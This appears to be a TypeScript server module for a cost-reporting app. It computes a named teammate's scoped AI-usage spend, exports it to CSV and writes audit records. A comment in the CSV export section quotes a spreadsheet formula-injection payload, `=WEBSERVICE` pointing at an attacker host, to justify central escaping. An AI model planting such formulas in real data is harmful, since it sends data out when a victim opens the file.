/*
 * reporting/teammate — the E3 CONTRIBUTION view of one named individual
 * (developer pages build D31-D34; evidence annex :784-798).
 *
 * It lives here, inside `server/reporting/**`, and not under `server/usage/**`
 * or `me/*`, for one reason stated in three places (00-brief.md:39-49, D32,
 * annex :557-561): this directory and `server/api/v1/reports/**` are the two
 * scan roots of the lane firewall AND the two dirs the per-literal-endpoint
 * 200/403 suite enumerates. A manager-facing named-individual page anywhere
 * else would need the grants model but be invisible to the tests that pin where
 * the grants model reaches — a second, unproven RBAC path.
 *
 * ── C14: THE QUERY CARRIES THE ENTRY SCOPE PREDICATE, NEVER A BARE ID ────────
 * Every SUBJECT figure below is computed over `v_complete_usage` filtered by
 * (subject ∧ window ∧ the scope predicate the `?src=` frame resolved to). The
 * pinned outcome: alice's `apac.cto` driver row says 100
 * (known-outcome-validation.test.ts:214-220) and the drill opened from it must
 * head at 100 — never her personal 350, 250 of which homes to a scope the
 * viewer does not hold (annex :893-901).
 *
 * ── THE ONE DELIBERATE EXCEPTION: THE TOKENSHEET DENOMINATORS (r1-H3) ────────
 * "Share of project" and the budget state are WHOLE-PROJECT figures over ALL
 * members, computed with NO scope predicate, beside a scope-filtered numerator.
 * That is sanctioned, not a leak: the budget belongs to the PROJECT, so the
 * project total vs allocation is visible to everyone in scope (annex :532-543).
 * A scoped denominator would render 100% shares and misstate every budget
 * position — the exact error :536-540 describes.
 *
 * ── LANE ────────────────────────────────────────────────────────────────────
 * `v_complete_usage` only, for every figure. No `attribution_record`, no raw
 * `actual_spend`, no `attribution_aggregate` — the firewall scans this file
 * (tests/unit/server/reports-lane-firewall.test.ts:29) and the me-side series
 * helpers all read the banned aggregate, which is why none of them is reused
 * here (annex :883-891 limits sanctioned reuse to `resolveReportWindow`,
 * `providerStatesForWindow`, `reportCoverageMeta` and `projections.ts`).
 */
import { createError, getRequestIP, getHeader } from 'h3'
import { sql } from 'drizzle-orm'
import { consola } from 'consola'
import type { H3Event } from 'h3'
import type { PostgresJsDatabase } from 'drizzle-orm/postgres-js'
import { withRequestRls } from '../db/request-rls'
import { recordAuditEvent } from '../db/audit'
import { costCentreScopeOpts } from '../auth/report-scope'
import { csvEscape } from '../utils/csv-escape'
import { isUuid } from '../utils/uuid'
import type { Session } from '../utils/auth'
import type { ReportScopeGrants } from '../../shared/auth/report-visibility'
import { toolToVendor, VENDOR_LABELS, VENDOR_LANES, type Vendor } from '../../shared/usage/vendor'
import { scopeSql, wholeCompanyUsage, clampedUsage, type UsageScope } from './engine/scope'
import { resolveRegionalScope } from './regional'
import { resolveCostCentreDrill } from './cost-centres'
import type { UsageWindow } from './params'

type Tx = PostgresJsDatabase<Record<string, unknown>>

/* ── The `?src=` scope frame (D16/D30/D33) ─────────────────────────────────── */

/**
 * A resolved drill frame: WHICH of the caller's own grants frames this view, the
 * §A predicate it maps to, and the words the page echoes.
 *
 * `token` is echoed verbatim so the target's provenance line and its breadcrumb
 * can reconstruct the ENTRY report URL (D30) rather than calling
 * `history.back()`, which breaks on refresh and on a shared link.
 */
export interface DrillScope {
  /** The `?src=` token, echoed back exactly as it was honoured. */
  token: string
  /** Human words for the provenance line ("Business Unit · AI Apps & Data"). */
  label: string
  /** The §A clamp, over `u.region_id` / `u.org_unit_id` / `u.cost_owning_unit_id`. */
  usage: UsageScope
  /** Stable identity of the resolved frame — response-cache key material. */
  key: string
}

const SRC_TOKEN_RE = /^(?:across|finance|cc:[\w.:-]+|region:[\w.:-]+)$/

/** Shape-only validation, mirroring the client's `isScopeSrcToken`. Never a grant check. */
export function isScopeSrcToken(v: string): boolean {
  return SRC_TOKEN_RE.test(v)
}

function forbidSrc(detail: string): never {
  throw createError({
    statusCode: 403,
    statusMessage: 'Forbidden',
    data: {
      type: 'https://tokenscope.example.com/errors/forbidden',
      title: 'Forbidden',
      status: 403,
      detail,
    },
  })
}

/**
 * Map a `?src=` token onto the CALLER'S OWN grants and resolvers.
 *
 * THE TOKEN NEVER AUTHORISES (D33). It SELECTS among frames the caller already
 * holds; a token naming a scope they do not hold is a 403, never a fallback to
 * something narrower. A fallback would be worse than the 403: the page would
 * render a headline under a scope word the reader did not ask for, and the C14
 * "$100 row must not open a $350 page" pin would pass while the frame silently
 * moved.
 *
 * There is no default frame. A drill with no `src` is a bare `teammate_id`,
 * which is the thing C14 forbids — the endpoint 400s rather than inventing one.
 */
export async function resolveDrillScope(
  tx: Tx,
  session: Session,
  grants: ReportScopeGrants,
  src: string,
): Promise<DrillScope> {
  if (!isScopeSrcToken(src)) {
    throw createError({
      statusCode: 400,
      statusMessage: 'Bad Request',
      data: {
        type: 'https://tokenscope.example.com/errors/bad-request',
        title: 'Bad Request',
        status: 400,
        detail: '`src` must be one of: across | finance | cc:{id} | region:{id}.',
      },
    })
  }

  if (src === 'across') {
    if (!grants.across) forbidSrc('Your role does not grant the whole-company frame.')
    return { token: src, label: 'All regions', usage: wholeCompanyUsage, key: 'across' }
  }

  if (src === 'finance') {
    /*
     * The finance frame is the whole-company one: `/reports/finance` is
     * region-unbounded by design (there is no region-clamp level to express —
     * see ReportScopeGrants.finance). §A subject figures under it are therefore
     * unclamped, gated on the finance grant and nothing else. It is a §A read
     * under a §B-origin frame, which is exactly what a finance overage row
     * drilling to a person means: "who is this, across the company".
     */
    if (!grants.finance) forbidSrc('Your role does not grant the finance frame.')
    return { token: src, label: 'Finance · whole company', usage: wholeCompanyUsage, key: 'finance' }
  }

  if (src.startsWith('cc:')) {
    if (grants.costCentre === false) forbidSrc('Your role does not grant a Business Unit view.')
    const ccId = src.slice(3)
    // `isUuid`, NOT the legacy lax `/^[0-9a-f-]{36}$/i` (the known-bad API-5
    // pattern retired by server/utils/require-uuid-param.ts). The lax form
    // accepted 36 chars of hex-and-dash — `cc:------------------------------------`
    // passes it, and the `::uuid` cast below then raises a Postgres 22P02 with NO
    // statusCode, which surfaces as a 500. That is an unusable FRAME being reported
    // as a server fault, and it is outside the closed 400/403/404 set the project
    // endpoint degrades on (reports/project/[code].get.ts) — so the frame took the
    // whole page down. A malformed id is a 400, here, where it is decidable.
    if (!isUuid(ccId)) {
      throw createError({ statusCode: 400, statusMessage: 'invalid Business Unit id' })
    }
    // Anti-IDOR, unchanged: absent / retired / non-cost-owning / foreign / unowned
    // all raise the SAME 403 (cost-centres.ts:183 — an existence oracle over other
    // regions' cost-centre ids is the failure this collapse exists to prevent).
    const cc = await resolveCostCentreDrill(tx, session, ccId, costCentreScopeOpts(session, grants))
    return {
      token: src,
      label: `Business Unit · ${cc.displayName}`,
      // The SAME §A clamp the cost-centre burn drill uses
      // (`fetchCostCentreBurnDrill`), so a drill opened from a CC row computes
      // over the population that row was ranked in.
      usage: clampedUsage(sql`u.cost_owning_unit_id = ${cc.id}::uuid`),
      key: `cc:${cc.id}`,
    }
  }

  // region:{id}
  if (grants.regional === false) forbidSrc('Your role does not grant a regional frame.')
  const regionId = src.slice('region:'.length)
  // `isUuid` — see the identical note on the `cc:` branch above.
  if (!isUuid(regionId)) {
    throw createError({ statusCode: 400, statusMessage: 'invalid region id' })
  }
  const scope = await resolveRegionalScope(
    tx,
    { role: session.role, regionId: session.regionId },
    { region: regionId },
    { crossRegion: grants.regional === 'all-regions' },
  )
  /*
   * `resolveRegionalScope` CLAMPS a non-cross-region caller to their own region
   * and silently ignores the `region` param. That is right for a report page
   * (the caller lands somewhere valid) and WRONG for a drill frame: it would
   * honour `src=region:{someone else's}` by quietly reframing on the caller's
   * own, and the page would then echo a provenance line naming a region nothing
   * was computed for. A frame the caller does not hold is a 403 (D33).
   */
  if (scope.effectiveRegionId !== regionId) {
    forbidSrc('Your role does not grant that region as a frame.')
  }
  return {
    token: src,
    label: `Region · ${scope.region?.displayName ?? scope.effectiveRegionId}`,
    usage: clampedUsage(scope.usageScope('u.teammate_id')),
    key: `region:${scope.scopeKey}`,
  }
}

/* ── The subject ───────────────────────────────────────────────────────────── */

/**
 * MANAGER-FACING ⇒ CONFIRMED IDENTITY ONLY (r3-H2).
 *
 * `identity_state = 'provisional'` means the teammate/device binding behind the
 * ROW is not yet proven (mig 0057 / complete-spend.ts:69-72). Every other
 * manager-facing figure in the estate already drops it — `completeOneProjectSpend`
 * and friends take `excludeProvisional`, and the project page, the budget editor
 * and the cost-centre axis all pass it. This surface is the most manager-facing
 * of all (a named individual, audited, exportable) and was the ONE that did not:
 * its headline, TokenSheet, mixes, denominators and CSV all counted unproven
 * spend, so the same person footed to two different totals depending on which
 * page you opened them from.
 *
 * Applied to EVERY subject figure below — including the whole-project
 * DENOMINATOR, which is the same figure the project page publishes and must not
 * disagree with it.
 */
export const CONFIRMED_ONLY = sql`u.identity_state IS DISTINCT FROM 'provisional'`

export interface TeammateIdentity {
  id: string
  displayName: string
  email: string
  /** `teammate.is_active` — D34's SECOND conjunct, carried separately. */
  isActive: boolean
  /**
   * `teammate.provisional` — D34's THIRD conjunct (r3-H2). A shadow minted by
   * the unauthenticated enrol path: an ACTIVE row whose email is an unproven
   * claim. Carried separately from `isActive` for the same reason `isActive` is
   * carried separately from the homing EXISTS — each conjunct is its own fact.
   */
  isProvisional: boolean
  /** CURRENT placement — the same placement every report groups this person's usage by. */
  practice: string | null
  region: string | null
  costOwningUnit: string | null
}

/** Identity header operands. Returns `null` for an id that does not exist. */
export async function fetchTeammateIdentity(
  tx: Tx,
  subjectId: string,
): Promise<TeammateIdentity | null> {
  const rows = await tx.execute<{
    id: string
    display_name: string | null
    email: string
    is_active: boolean
    provisional: boolean
    practice: string | null
    region: string | null
    cou: string | null
  }>(sql`
    SELECT t.id::text AS id, t.display_name, t.email, t.is_active, t.provisional,
           ou.display_name AS practice, r.display_name AS region,
           cou.cost_owning_unit_name AS cou
      FROM teammate t
      LEFT JOIN org_unit ou ON ou.id = t.org_unit_id
      LEFT JOIN region r ON r.id = t.region_id
      LEFT JOIN v_org_unit_cost_owner cou ON cou.org_unit_id = t.org_unit_id
     WHERE t.id = ${subjectId}::uuid
     LIMIT 1`)
  const r = [...rows][0]
  if (!r) return null
  return {
    id: r.id,
    displayName: r.display_name || r.email,
    email: r.email,
    isActive: r.is_active,
    isProvisional: r.provisional === true,
    practice: r.practice,
    region: r.region,
    costOwningUnit: r.cou,
  }
}

/**
 * D34's FIRST conjunct: does the subject have ≥1 in-window row ALREADY inside
 * this frame? Read on CURRENT placement (current-org lens), the same lens the
 * frame's own report ranked them in.
 *
 * It also anchors the WINDOW: an empty in-scope window is a 403 in the same
 * shape as no-grant, so the endpoint is never an existence oracle about scopes
 * (or people) the caller cannot see.
 */
export async function subjectHasInScopeRow(
  tx: Tx,
  scope: UsageScope,
  subjectId: string,
  win: UsageWindow,
): Promise<boolean> {
  const rows = await tx.execute<{ present: boolean }>(sql`
    SELECT EXISTS (
      SELECT 1 FROM v_complete_usage_current u
       WHERE u.teammate_id = ${subjectId}::uuid
         AND ${scopeSql(scope)}
         AND ${CONFIRMED_ONLY}
         AND u.ts_event >= ${win.startIso}::timestamptz
         AND u.ts_event <  ${win.endIso}::timestamptz
    ) AS present`)
  return [...rows][0]?.present === true
}

/* ── The TokenSheet (D31, r1-H3) ───────────────────────────────────────────── */

export interface TokenSheetRow {
  projectId: string
  projectCode: string
  projectName: string
  /** NUMERATOR — the subject's contribution INSIDE the frame (C14). */
  contributionUsd: number
  /** DENOMINATOR — the WHOLE project's window total over ALL members (r1-H3). */
  projectWindowUsd: number
  /**
   * The project's current-effective allocation, or `null` for "no budget set".
   * ABSENT-as-null is load-bearing: `BudgetStateCell` renders "no budget set"
   * (a decision nobody made) rather than 0%, which would read as spent-out.
   */
  allocationUsd: number | null
  /** `contributionUsd / projectWindowUsd`, or null when the project total is 0. */
  sharePct: number | null
}

/**
 * Rows = projects the subject contributed to INSIDE the frame, each carrying
 * BOTH operands (r1-H3): the scoped numerator and the unscoped whole-project
 * denominator + allocation. Ordered by contribution, name-tiebroken so the CSV
 * export is byte-reproducible between two identical requests.
 *
 * Untagged (NULL-project) spend is NOT a row here — it is the worklist-pressure
 * line, because it is not a contribution against any budget.
 */
export async function fetchTeammateTokenSheet(
  tx: Tx,
  scope: UsageScope,
  subjectId: string,
  win: UsageWindow,
): Promise<TokenSheetRow[]> {
  const rows = await tx.execute<{
    project_id: string
    code: string
    display_name: string
    mine: string
    project_total: string
    alloc: string | null
  }>(sql`
    WITH mine AS (
      SELECT u.project_id, COALESCE(SUM(u.cost_usd), 0) AS usd
        FROM v_complete_usage_current u
       WHERE u.teammate_id = ${subjectId}::uuid
         AND u.project_id IS NOT NULL
         AND ${scopeSql(scope)}
         AND ${CONFIRMED_ONLY}
         AND u.ts_event >= ${win.startIso}::timestamptz
         AND u.ts_event <  ${win.endIso}::timestamptz
       GROUP BY u.project_id
    ),
    -- The DENOMINATOR: the whole project over ALL members, NO scope predicate.
    -- Sanctioned by the named-row rule (annex :532-543) precisely because the
    -- budget belongs to the project, not to the people the viewer can see.
    whole AS (
      SELECT u.project_id, COALESCE(SUM(u.cost_usd), 0) AS usd
        FROM v_complete_usage_current u
       WHERE u.project_id IN (SELECT project_id FROM mine)
         AND ${CONFIRMED_ONLY}
         AND u.ts_event >= ${win.startIso}::timestamptz
         AND u.ts_event <  ${win.endIso}::timestamptz
       GROUP BY u.project_id
    ),
    -- The SAME allocation predicate every other budget figure sums
    -- (consumption.ts fetchProjectAllocations / cost-centres.ts
    -- fetchCostCentreProjectBudgets): pool baseline + top-up, currently effective.
    -- A project with no active allocation is ABSENT, never 0.
    alloc AS (
      SELECT a.scope_id AS project_id, COALESCE(SUM(a.budget_usd), 0) AS usd
        FROM allocation a
       WHERE a.scope_type = 'project'
         AND a.scope_id IN (SELECT project_id FROM mine)
         AND a.allocation_kind IN ('baseline', 'top-up')
         AND a.teammate_id IS NULL
         AND a.effective @> now()
       GROUP BY a.scope_id
    )
    SELECT p.id::text AS project_id, p.code, p.display_name,
           m.usd::text AS mine,
           COALESCE(w.usd, 0)::text AS project_total,
           al.usd::text AS alloc
      FROM mine m
      JOIN project p ON p.id = m.project_id
      LEFT JOIN whole w ON w.project_id = m.project_id
      LEFT JOIN alloc al ON al.project_id = m.project_id
     ORDER BY m.usd DESC, p.display_name ASC, p.code ASC`)

  return [...rows].map((r) => {
    const contributionUsd = Number(r.mine)
    const projectWindowUsd = Number(r.project_total)
    return {
      projectId: r.project_id,
      projectCode: r.code,
      projectName: r.display_name,
      contributionUsd,
      projectWindowUsd,
      allocationUsd: r.alloc == null ? null : Number(r.alloc),
      sharePct: projectWindowUsd > 0 ? contributionUsd / projectWindowUsd : null,
    }
  })
}

/* ── The two dimensions every arm carries (annex :910-916) ─────────────────── */

export interface MixSlice {
  key: string
  label: string
  usd: number
  sharePct: number
}

export interface TeammateContribution {
  /** Σ of the subject's in-scope window spend — the page headline. */
  headlineUsd: number
  /** Distinct days with in-scope spend — the identity header's "active N of M". */
  activeDays: number
  surfaceMix: MixSlice[]
  provenanceMix: MixSlice[]
  /**
   * The NO-PROJECT states, SPLIT — never one lump (r3-M5).
   *
   * The single figure this replaces was "everything with no project claim",
   * rendered under the word "worklist". Three different states were inside it,
   * and only ONE of them is anybody's queue:
   *   - `untaggedUsd`      — taggable spend awaiting a decision. The only part
   *                          that can reach a needs-tagging queue.
   *   - `activityTaggedUsd`— a decision the subject ALREADY made (an activity
   *                          tag, no project budget). Counting a completed
   *                          decision as pressure invents work.
   *   - `untaggableUsd`    — §A arm 3 (`usage_provenance = 'provider-usage'`,
   *                          mig 0101): provider-reported usage with no session
   *                          and no `unaccounted_usage` row to attach anything
   *                          to. Structurally unactionable BY CONSTRUCTION, so
   *                          it can never be pressure on anyone.
   * `server/utils/me-queries.ts:77-127` is the authoritative statement of that
   * split; this is the same split, expressed with the operands this LANE
   * carries.
   *
   * ONE state it deliberately does NOT claim: DISMISSED. Dismissal is keyed on
   * the conversation / `unaccounted_usage` row, and the usage lane projects
   * neither key (mig 0125:84-105), so a dismissed item is indistinguishable
   * from an awaiting-decision one HERE. `untaggedUsd` is therefore an UPPER
   * BOUND on the subject's queue, and the surface says "no project claim" — it
   * does not promise a queue length it cannot measure.
   */
  worklist: {
    /** No project, taggable arm, no activity — awaiting a decision (or dismissed). */
    untaggedUsd: number
    /** No project, but already carrying an activity tag: a decision, not a queue item. */
    activityTaggedUsd: number
    /** §A arm 3 — provider-reported usage nothing can be attached to. */
    untaggableUsd: number
    /**
     * DISTINCT DAYS that `untaggedUsd` spans, NOT a session count. The usage
     * lane has no session axis (`v_complete_usage` does not project
     * `claude_session_id` — mig 0125:84-105), and the ledger that does is
     * firewalled off this path. Days is the honest grain this lane can state;
     * an invented "N items" would be a number nothing here measured.
     */
    untaggedDays: number
  }
}

/**
 * Which NO-PROJECT state a lane row is in — the authoritative split of
 * `server/utils/me-queries.ts:77-127`, written once here over the columns
 * `v_complete_usage` actually carries. Rows WITH a project are `'tagged'`.
 */
const NO_PROJECT_STATE = sql`CASE
  WHEN u.project_id IS NOT NULL THEN 'tagged'
  WHEN u.usage_provenance = 'provider-usage' THEN 'untaggable'
  WHEN COALESCE(btrim(u.activity), '') <> '' THEN 'activity-tagged'
  ELSE 'untagged'
END`

export async function fetchTeammateContribution(
  tx: Tx,
  scope: UsageScope,
  subjectId: string,
  win: UsageWindow,
): Promise<TeammateContribution> {
  const rows = await tx.execute<{
    tool: string | null
    provenance: string | null
    usd: string
    state: string
    days: string
  }>(sql`
    SELECT u.tool AS tool, u.usage_provenance AS provenance,
           COALESCE(SUM(u.cost_usd), 0)::text AS usd,
           ${NO_PROJECT_STATE} AS state,
           COUNT(DISTINCT (u.ts_event AT TIME ZONE 'UTC')::date)::text AS days
      FROM v_complete_usage_current u
     WHERE u.teammate_id = ${subjectId}::uuid
       AND ${scopeSql(scope)}
       AND ${CONFIRMED_ONLY}
       AND u.ts_event >= ${win.startIso}::timestamptz
       AND u.ts_event <  ${win.endIso}::timestamptz
     GROUP BY u.tool, u.usage_provenance, ${NO_PROJECT_STATE}`)

  // Active days can NOT be summed out of the grouped rows above (one day can
  // appear under several tools), so it is its own scalar over the same clamp.
  // `untagged_days` counts the days of the WORKLIST-ELIGIBLE state only — the
  // same predicate as `untaggedUsd`, so the two operands of one sentence
  // ("$X untagged · N days") can never describe different populations.
  const dayRows = await tx.execute<{ active: string; untagged_days: string }>(sql`
    SELECT COUNT(DISTINCT (u.ts_event AT TIME ZONE 'UTC')::date)::text AS active,
           COUNT(DISTINCT (u.ts_event AT TIME ZONE 'UTC')::date)
             FILTER (WHERE ${NO_PROJECT_STATE} = 'untagged')::text AS untagged_days
      FROM v_complete_usage_current u
     WHERE u.teammate_id = ${subjectId}::uuid
       AND ${scopeSql(scope)}
       AND ${CONFIRMED_ONLY}
       AND u.ts_event >= ${win.startIso}::timestamptz
       AND u.ts_event <  ${win.endIso}::timestamptz`)
  const dayRow = [...dayRows][0]

  const all = [...rows]
  const headlineUsd = all.reduce((a, r) => a + Number(r.usd), 0)
  const sumOf = (state: string) =>
    all.filter((r) => r.state === state).reduce((a, r) => a + Number(r.usd), 0)
  const untaggedUsd = sumOf('untagged')
  const activityTaggedUsd = sumOf('activity-tagged')
  const untaggableUsd = sumOf('untaggable')

  const bySurface = new Map<string, number>()
  const byProvenance = new Map<string, number>()
  for (const r of all) {
    const usd = Number(r.usd)
    const lane = toolLane(r.tool)
    bySurface.set(lane, (bySurface.get(lane) ?? 0) + usd)
    const prov = r.provenance ?? 'unknown'
    byProvenance.set(prov, (byProvenance.get(prov) ?? 0) + usd)
  }

  return {
    headlineUsd,
    activeDays: Number(dayRow?.active ?? 0),
    surfaceMix: toMix(bySurface, headlineUsd, surfaceLabel),
    provenanceMix: toMix(byProvenance, headlineUsd, provenanceLabel),
    worklist: {
      untaggedUsd,
      activityTaggedUsd,
      untaggableUsd,
      untaggedDays: Number(dayRow?.untagged_days ?? 0),
    },
  }
}

/*
 * The surface mix folds by VENDOR LANE, not by raw tool, so the drill's mix and
 * the drivers table's `surfaceBreakdown` name the same lanes with the same
 * words. `toolToVendor` is the registry mapper; hand-coding a tool predicate
 * here instead is what the copilot-surface-lanes checklist forbids.
 */
function toolLane(tool: string | null): string {
  return toolToVendor(tool)
}
function surfaceLabel(lane: string): string {
  return VENDOR_LABELS[lane as Vendor] ?? lane
}
/*
 * Provenance words, stated ONCE for this surface. The reporting side has no
 * shared label map for the three provenances (DriversTable carries its own
 * private one), so this names them in the same words rather than shipping a
 * raw enum value to a reader.
 */
const PROVENANCE_LABELS: Record<string, string> = {
  'otel-emitted': 'OTel-emitted',
  'api-reconciled': 'API-reconciled',
  'provider-usage': 'provider usage',
}
function provenanceLabel(p: string): string {
  return PROVENANCE_LABELS[p] ?? p
}

function toMix(
  by: Map<string, number>,
  total: number,
  label: (k: string) => string,
): MixSlice[] {
  return [...by.entries()]
    .filter(([, usd]) => usd !== 0)
    .sort((a, b) => {
      // Canonical registry order where both keys are lanes (a fixed composition,
      // never $-desc — the LaneLegend rule); $-desc otherwise.
      const ia = (VENDOR_LANES as readonly string[]).indexOf(a[0])
      const ib = (VENDOR_LANES as readonly string[]).indexOf(b[0])
      if (ia >= 0 && ib >= 0) return ia - ib
      return b[1] - a[1]
    })
    .map(([key, usd]) => ({ key, label: label(key), usd, sharePct: total > 0 ? usd / total : 0 }))
}

/* ── The CSV export (fix 10) ───────────────────────────────────────────────── */

/*
 * EVERY textual cell goes through the CENTRAL escape (server/utils/csv-escape.ts),
 * never a local one. The local `csvCell` this replaces quoted CSV syntax only: it
 * did not neutralise the spreadsheet FORMULA prefixes (`=+-@`, tab, CR) that make
 * `=WEBSERVICE("https://attacker/")` in a directory display name or a project name
 * execute when the file is opened. This file is a portable named-person dataset —
 * the one export where a formula-bearing cell has both a plausible author (anyone
 * who can set a display name) and a reader who opens it in Excel.
 */
function csvCell(v: string | number | null): string {
  return csvEscape(v == null ? '' : String(v))
}

/**
 * The TokenSheet as CSV — byte-identical figures to the on-screen table, with a
 * leading provenance stamp naming the SUBJECT, the FRAME and the WINDOW.
 *
 * The stamp is not decoration: this file is a portable named-person dataset, and
 * a reader who finds it later must be able to tell which scope it was cut under
 * (the same reason the export writes its OWN audit event, r1-M1).
 */
export function tokenSheetToCsv(
  subject: TeammateIdentity,
  scope: DrillScope,
  win: UsageWindow,
  rows: readonly TokenSheetRow[],
): string {
  const out: string[] = []
  out.push(`# teammate,${csvCell(subject.displayName)}`)
  out.push(`# scope,${csvCell(scope.label)}`)
  out.push(`# window,${csvCell(`${win.startIso.slice(0, 10)}..${win.endIso.slice(0, 10)}`)}`)
  out.push('project_code,project,their_contribution_usd,project_window_usd,share_of_project,allocation_usd')
  for (const r of rows) {
    out.push(
      [
        csvCell(r.projectCode),
        csvCell(r.projectName),
        r.contributionUsd.toFixed(2),
        r.projectWindowUsd.toFixed(2),
        r.sharePct == null ? '' : r.sharePct.toFixed(4),
        r.allocationUsd == null ? '' : r.allocationUsd.toFixed(2),
      ].join(','),
    )
  }
  return out.join('\n') + '\n'
}

/* ── Response-cache key material (D28) ─────────────────────────────────────── */

/**
 * The RESOLVED authorization output of a teammate drill, as key material: the
 * frame's own key plus the subject. The ROUTE PARAM is named explicitly (r1-H1)
 * — two drills with identical queries must never share a body.
 */
export function teammateDrillKey(scope: DrillScope, subjectId: string): string {
  return `${scope.key}|subject:${subjectId}`
}

/* ── The read-audit events (D35, r1-M1) ────────────────────────────────────── */

/**
 * The TWO events this surface writes, and they are deliberately DISTINCT
 * (r1-M1): forensics must be able to tell a page VIEW from a portable
 * named-person DATASET leaving the building. The existing vocabulary already
 * gives exports their own event (`report-export-teammate-axis`), and a richer
 * per-person view must not be less traceable than the CSV it replaced.
 */
export type TeammateDrillAuditEvent = 'report-teammate-viewed' | 'report-teammate-export'

/**
 * Write one drill audit row on a SEPARATE connection — the
 * `report-scope-denied` precedent (report-scope.ts:171): the record must
 * survive a rollback of the request transaction.
 *
 * IDS AND COUNTS ONLY. Never row contents, never a dollar figure, never a
 * project name — the discipline `export.get.ts:200-251` already holds the
 * teammate-axis export to. An audit trail that copies the data it is auditing
 * is a second copy of the data.
 *
 * A write failure must never mask the read it was recording, but it IS itself
 * security-critical (this audit is the only record that a named individual's
 * page was opened), so it emits the same distinctive marker ops alert on.
 */
export async function writeDrillAudit(
  event: H3Event,
  eventType: TeammateDrillAuditEvent,
  input: { actorTeammateId: string; subjectId: string; payload: Record<string, unknown> },
): Promise<void> {
  try {
    /*
     * Its OWN transaction (withRequestRls opens one on the pool), deliberately
     * separate from whatever read the caller is running: this audit is the only
     * record that a named individual's page was opened, so it must not be rolled
     * back by a later failure in the read it is recording. What it no longer is
     * is identity-less — the connection carries the caller's RLS context
     * (docs/design/rls-enforcement.md §4).
     */
    await withRequestRls(event, (tx) =>
      recordAuditEvent(tx as unknown as Tx, {
        eventType,
        actorTeammateId: input.actorTeammateId,
        subjectKind: 'teammate',
        subjectId: input.subjectId,
        payload: input.payload,
        ipAddress: getRequestIP(event, { xForwardedFor: true }) ?? null,
        userAgent: getHeader(event, 'user-agent') ?? null,
      }),
    )
  } catch (err) {
    consola.error('[SECURITY-AUDIT-WRITE-FAILED] teammate-drill audit write failed', {
      eventType,
      actorTeammateId: input.actorTeammateId,
      subjectId: input.subjectId,
      error: err instanceof Error ? err.message : String(err),
    })
  }
}
